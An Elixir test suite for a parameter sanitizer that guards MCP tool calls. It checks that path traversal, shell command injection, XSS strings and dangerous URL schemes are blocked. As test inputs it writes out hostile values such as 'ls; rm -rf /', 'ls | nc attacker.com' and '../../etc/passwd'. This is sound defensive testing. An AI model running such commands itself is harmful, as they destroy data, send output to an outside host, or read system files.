defmodule TheMaestro.MCP.Security.ParameterSanitizerTest do
  use ExUnit.Case, async: true
  
  alias TheMaestro.MCP.Security.ParameterSanitizer
  alias TheMaestro.MCP.Security.ParameterSanitizer.SanitizationResult

  describe "sanitize_parameters/3" do
    test "sanitizes safe parameters without issues" do
      params = %{
        "path" => "/tmp/safe.txt",
        "mode" => "read",
        "timeout" => 30
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "read_file")
      
      assert %SanitizationResult{
        sanitized_params: sanitized,
        warnings: [],
        blocked: false,
        reason: nil
      } = result
      
      assert sanitized["path"] == "/tmp/safe.txt"
      assert sanitized["mode"] == "read"
      assert sanitized["timeout"] == 30
    end

    test "detects and warns about path traversal attempts" do
      params = %{
        "path" => "../../etc/passwd",
        "mode" => "read"
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "read_file")
      
      assert %SanitizationResult{
        warnings: warnings,
        blocked: true
      } = result
      
      assert Enum.any?(warnings, &String.contains?(&1, "Path traversal"))
    end

    test "detects command injection attempts" do
      params = %{
        "command" => "ls; rm -rf /"
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "execute_command")
      
      assert %SanitizationResult{
        warnings: warnings,
        blocked: true
      } = result
      
      assert Enum.any?(warnings, &String.contains?(&1, "Command injection"))
    end

    test "detects script injection patterns" do
      params = %{
        "content" => "<script>alert('xss')</script>",
        "title" => "onload=malicious()"
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "write_file")
      
      assert %SanitizationResult{
        warnings: warnings,
        blocked: true
      } = result
      
      assert Enum.any?(warnings, &String.contains?(&1, "script injection"))
    end

    test "handles nested map parameters" do
      params = %{
        "config" => %{
          "path" => "../../../secret",
          "command" => "safe_command"
        }
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "configure")
      
      assert %SanitizationResult{
        warnings: warnings,
        blocked: true
      } = result
      
      assert Enum.any?(warnings, &String.contains?(&1, "Path traversal"))
    end

    test "sanitizes list parameters" do
      params = %{
        "files" => ["/tmp/safe.txt", "../../etc/passwd", "/tmp/other.txt"]
      }
      
      result = ParameterSanitizer.sanitize_parameters(params, "process_files")
      
      assert %SanitizationResult{
        warnings: warnings,
        blocked: true
      } = result
      
      assert Enum.any?(warnings, &String.contains?(&1, "item[1]"))
    end

    test "respects strict mode option" do
      params = %{
        "command" => "rm file.txt"
      }
      
      # Normal mode - should pass
      result1 = ParameterSanitizer.sanitize_parameters(params, "execute_command", strict_mode: false)
      refute result1.blocked
      
      # Strict mode - should be blocked due to 'rm' command
      result2 = ParameterSanitizer.sanitize_parameters(params, "execute_command", strict_mode: true)
      assert result2.blocked
    end
  end

  describe "sanitize_path/2" do
    test "allows safe paths" do
      assert {:ok, "/tmp/safe.txt"} = ParameterSanitizer.sanitize_path("/tmp/safe.txt")
      assert {:ok, "/home/user/document.pdf"} = ParameterSanitizer.sanitize_path("/home/user/document.pdf")
    end

    test "blocks path traversal attempts" do
      assert {:error, reason} = ParameterSanitizer.sanitize_path("../../../etc/passwd")
      assert String.contains?(reason, "Path traversal")
      
      assert {:error, _} = ParameterSanitizer.sanitize_path("..\\..\\windows\\system32")
      assert {:error, _} = ParameterSanitizer.sanitize_path("%2e%2e%2f%2e%2e%2fetc")
    end

    test "enforces allowed paths when specified" do
      allowed_paths = ["/tmp/", "/home/user/"]
      
      assert {:ok, _} = ParameterSanitizer.sanitize_path("/tmp/file.txt", allowed_paths: allowed_paths)
      assert {:error, reason} = ParameterSanitizer.sanitize_path("/etc/passwd", allowed_paths: allowed_paths)
      assert String.contains?(reason, "not in allowed")
    end

    test "normalizes paths" do
      assert {:ok, "/tmp/file.txt"} = ParameterSanitizer.sanitize_path("  /tmp//file.txt  ")
    end

    test "rejects invalid path formats" do
      assert {:error, _} = ParameterSanitizer.sanitize_path("/path/with\0null")
      assert {:error, _} = ParameterSanitizer.sanitize_path(String.duplicate("a", 5000))
    end
  end

  describe "sanitize_command/2" do
    test "allows safe commands" do
      assert {:ok, "ls -la"} = ParameterSanitizer.sanitize_command("ls -la")
      assert {:ok, "grep pattern file.txt"} = ParameterSanitizer.sanitize_command("grep pattern file.txt")
    end

    test "blocks command injection attempts" do
      assert {:error, reason} = ParameterSanitizer.sanitize_command("ls; rm -rf /")
      assert String.contains?(reason, "Command injection")
      
      assert {:error, _} = ParameterSanitizer.sanitize_command("ls && malicious")
      assert {:error, _} = ParameterSanitizer.sanitize_command("ls | nc attacker.com")
      assert {:error, _} = ParameterSanitizer.sanitize_command("$(malicious)")
    end

    test "respects strict mode for suspicious commands" do
      # Should pass in normal mode
      assert {:ok, _} = ParameterSanitizer.sanitize_command("rm file.txt", strict_mode: false)
      
      # Should be blocked in strict mode
      assert {:error, reason} = ParameterSanitizer.sanitize_command("rm file.txt", strict_mode: true)
      assert String.contains?(reason, "Suspicious")
    end

    test "limits command length" do
      long_command = String.duplicate("a", 2000)
      assert {:ok, sanitized} = ParameterSanitizer.sanitize_command(long_command)
      assert String.length(sanitized) <= 1024
    end
  end

  describe "sanitize_url/2" do
    test "allows safe URLs" do
      assert {:ok, "https://example.com"} = ParameterSanitizer.sanitize_url("https://example.com")
      assert {:ok, "http://localhost:3000"} = ParameterSanitizer.sanitize_url("http://localhost:3000")
    end

    test "blocks malicious URL protocols" do
      assert {:error, _} = ParameterSanitizer.sanitize_url("javascript:alert('xss')")
      assert {:error, _} = ParameterSanitizer.sanitize_url("data:text/html,<script>alert('xss')</script>")
      assert {:error, _} = ParameterSanitizer.sanitize_url("file:///etc/passwd")
    end

    test "validates URL format" do
      assert {:error, reason} = ParameterSanitizer.sanitize_url("not-a-url")
      assert String.contains?(reason, "Invalid URL format")
      
      assert {:error, _} = ParameterSanitizer.sanitize_url("://missing-scheme")
    end

    test "respects allowed protocols" do
      # Default allows http and https
      assert {:ok, _} = ParameterSanitizer.sanitize_url("https://example.com")
      assert {:error, _} = ParameterSanitizer.sanitize_url("ftp://example.com")
      
      # Custom allowed protocols
      assert {:ok, _} = ParameterSanitizer.sanitize_url("ftp://example.com", allowed_protocols: ["ftp"])
      assert {:error, _} = ParameterSanitizer.sanitize_url("https://example.com", allowed_protocols: ["ftp"])
    end
  end

  describe "validate_parameters_safe?/3" do
    test "returns true for safe parameters" do
      params = %{"path" => "/tmp/safe.txt"}
      assert ParameterSanitizer.validate_parameters_safe?(params, "read_file")
    end

    test "returns false for dangerous parameters" do
      params = %{"command" => "ls; rm -rf /"}
      refute ParameterSanitizer.validate_parameters_safe?(params, "execute_command")
    end

    test "returns true when block_on_suspicion is disabled" do
      params = %{"command" => "ls; rm -rf /"}
      assert ParameterSanitizer.validate_parameters_safe?(params, "execute_command", block_on_suspicion: false)
    end
  end
end